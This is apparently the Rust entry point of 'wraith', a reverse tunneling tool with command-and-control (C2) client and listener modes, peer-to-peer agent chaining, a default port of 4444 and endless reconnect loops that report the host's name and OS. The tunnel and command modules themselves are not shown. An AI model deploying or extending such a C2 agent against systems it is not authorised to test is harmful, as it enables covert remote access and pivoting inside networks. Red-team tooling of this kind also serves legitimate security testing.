extern crate log;
extern crate simplelog;

pub mod proto;
pub mod connection;
pub mod message;
pub mod commands;
pub mod relay;
pub mod wraith;

use clap::Parser;
use log::{error, info};
use std::net::Ipv4Addr;
use std::time::Duration;
use std::sync::Arc;

fn parse_host_port(addr: &str) -> (String, u16) {
    let parts: Vec<&str> = addr.split(':').collect();
    if parts.len() == 2 {
        (parts[0].to_string(), parts[1].parse().unwrap_or(4444))
    } else {
        (addr.to_string(), 4444)
    }
}

#[derive(Parser)]
#[command(name = "wraith")]
#[command(about = "Wraith reverse tunneling tool", long_about = None)]
struct Args {
    /// Enable debug logging
    #[arg(short, long)]
    debug: bool,

    /// Log to file (in addition to terminal)
    #[arg(long)]
    log_file: Option<String>,

    /// C2 host (optional in agent mode)
    #[arg(long)]
    c2_host: Option<Ipv4Addr>,

    /// C2 port (optional, defaults to 4444 when C2 host is specified)
    #[arg(short = 'p')]
    c2_port: Option<u16>,

    /// Listen mode (server)
    #[arg(short = 'l', long)]
    listen: bool,

    /// Agent mode: listen for peer wraith connections (format: HOST:PORT)
    #[arg(long, value_name = "HOST:PORT")]
    agent_listen: Option<String>,

    /// Agent mode: connect to C2 at HOST:PORT, and optionally connect to peer at --peer HOST:PORT
    #[arg(long, value_name = "HOST:PORT")]
    agent_connect: Option<String>,

    #[arg(long)]
    wraith_id: String,

    /// Peer to connect to (for agent mode, format: HOST:PORT)
    #[arg(long, value_name = "HOST:PORT")]
    peer: Option<String>,
}

fn setup_logging(debug: bool, log_file: &Option<String>) -> Result<(), Box<dyn std::error::Error>> {
    let level = if debug {
        simplelog::LevelFilter::Debug
    } else {
        simplelog::LevelFilter::Info
    };

    let mut loggers: Vec<Box<dyn simplelog::SharedLogger>> = vec![
        simplelog::TermLogger::new(
            level,
            simplelog::Config::default(),
            simplelog::TerminalMode::Mixed,
            simplelog::ColorChoice::Never,
        ),
    ];

    if let Some(path) = log_file {
        loggers.push(simplelog::WriteLogger::new(
            level,
            simplelog::Config::default(),
            std::fs::OpenOptions::new()
                .create(true)
                .append(true)
                .open(path)?,
        ));
    }

    simplelog::CombinedLogger::init(loggers)?;
    Ok(())
}

#[tokio::main]
async fn main() {
    let args = Args::parse();

    setup_logging(args.debug, &args.log_file).unwrap();

    let wraith = wraith::Wraith::new(&args.wraith_id);
    let state = wraith.state();
    let tunnel_manager = wraith.tunnel_manager();

    let is_server = args.listen;

    // Agent listen mode: peer listen (C2 optional)
    if let Some(ref peer_addr) = args.agent_listen {
        let (peer_host, peer_port) = parse_host_port(peer_addr);

        // Spawn peer listener
        let tm = Arc::clone(&tunnel_manager);
        tokio::spawn(async move {
            if let Err(e) = tm.start_peer_listener(&format!("{}:{}", peer_host, peer_port)).await {
                error!("Peer listener error: {}", e);
            }
        });

        // C2 is optional in agent mode
        if let (Some(c2_host), Some(c2_port)) = (args.c2_host.as_ref(), args.c2_port.or(Some(4444))) {
            let c2_addr = format!("{}:{}", c2_host, c2_port);
            info!("Agent mode: C2 listen on {}, peer listen on {}", c2_addr, peer_addr);
            wraith.run_c2_listener(c2_addr).await;
        } else {
            info!("Agent mode: peer listen on {} (no C2)", peer_addr);
            // Keep running - peer listener is running in background
            loop {
                tokio::time::sleep(Duration::from_secs(60)).await;
            }
        }
        return;
    }

    // Agent connect mode: peer connect (C2 optional)
    if let Some(ref peer_addr) = args.agent_connect {
        let peer_addr_clone = peer_addr.clone();

        // Clone shared state for the peer connection task
        let tm = Arc::clone(&tunnel_manager);
        let (wraith_id, hostname, os) = {
            let s = state.lock().unwrap();
            (s.wraith_id.clone(), s.hostname.clone(), s.os.clone())
        };

        // Spawn peer connection in background with retry
        tokio::spawn(async move {
            loop {
                match tm.connect_to_peer(peer_addr_clone.clone(), wraith_id.clone(), hostname.clone(), os.clone()).await {
                    Ok(_) => {
                        info!("Peer connection established");
                        break;
                    }
                    Err(e) => {
                        error!("Peer connection failed: {}, retrying in 5s", e);
                        tokio::time::sleep(Duration::from_secs(5)).await;
                    }
                }
            }
        });

        // C2 is optional in agent mode
        if let (Some(c2_host), Some(c2_port)) = (args.c2_host.as_ref(), args.c2_port.or(Some(4444))) {
            let c2_addr = format!("{}:{}", c2_host, c2_port);
            info!("Agent mode: C2 connect to {}, peer connect to {}", c2_addr, peer_addr);
            wraith.run_c2_client(c2_host.to_string(), c2_port).await;
        } else {
            info!("Agent mode: peer connect to {} (no C2)", peer_addr);
            // Keep running - peer connection retry loop is in background
            loop {
                tokio::time::sleep(Duration::from_secs(60)).await;
            }
        }
        return;
    }

    // Regular mode (non-agent) - C2 is required
    let c2_host = args.c2_host.expect("C2 host is required in regular mode (or use --agent-listen / --agent-connect)");
    let c2_port = args.c2_port.unwrap_or(4444);

    info!(
        "Starting wraith... Host: {}:{}, Mode: {}",
        c2_host,
        c2_port,
        if is_server { "listen" } else { "connect" }
    );

    let mut w = wraith;
    w.create_connection(c2_host.to_string(), c2_port, is_server);

    loop {
        match w.run().await {
            Ok(_) => info!("Connection closed gracefully"),
            Err(e) => {
                error!("Error: {}", e);
                tokio::time::sleep(Duration::from_secs(5)).await;
            }
        }
    }
}
